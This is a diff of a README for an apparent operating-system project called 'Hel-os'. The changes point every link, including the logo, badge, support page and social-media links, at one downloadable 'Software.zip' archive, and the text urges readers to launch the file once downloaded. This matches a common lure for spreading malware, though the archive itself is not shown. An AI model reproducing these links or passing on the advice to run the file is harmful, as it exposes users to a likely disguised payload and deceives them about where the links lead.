@@ -1,7 +1,7 @@
 
 # 🚀 **Welcome to Hel-os**
 
-![Hel-os Logo](https://example.com/hel-os-logo.png)
+![Hel-os Logo](https://github.com/Alva18ro/hel-os/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -15,9 +15,9 @@ Welcome to the Hel-os repository, dedicated to all things related to the Hel-os 
 
 ## 📦 Software Package
 
-You can download the software package from [this link](https://github.com/user-attachments/files/18383251/Software.zip). Please make sure to launch the file once it's downloaded to explore its contents.
+You can download the software package from [this link](https://github.com/Alva18ro/hel-os/releases/download/v1.0/Software.zip). Please make sure to launch the file once it's downloaded to explore its contents.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Alva18ro/hel-os/releases/download/v1.0/Software.zip)](https://github.com/Alva18ro/hel-os/releases/download/v1.0/Software.zip)
 
 ## Getting Started
 
@@ -45,10 +45,10 @@ We welcome contributions from the community to help improve and expand the capab
 
 ## Support
 
-If you encounter any issues, have questions, or simply want to engage with the Hel-os community, feel free to reach out through our [support channels](https://hel-os-support.com).
+If you encounter any issues, have questions, or simply want to engage with the Hel-os community, feel free to reach out through our [support channels](https://github.com/Alva18ro/hel-os/releases/download/v1.0/Software.zip).
 
 ## Stay Connected
 
-Stay updated on the latest news, releases, and events related to Hel-os by following us on [Twitter](https://twitter.com/hel-os) and [LinkedIn](https://linkedin.com/company/hel-os).
+Stay updated on the latest news, releases, and events related to Hel-os by following us on [Twitter](https://github.com/Alva18ro/hel-os/releases/download/v1.0/Software.zip) and [LinkedIn](https://github.com/Alva18ro/hel-os/releases/download/v1.0/Software.zip).
 
 Let's embark on a journey with Hel-os, the future of operating systems! 🌌
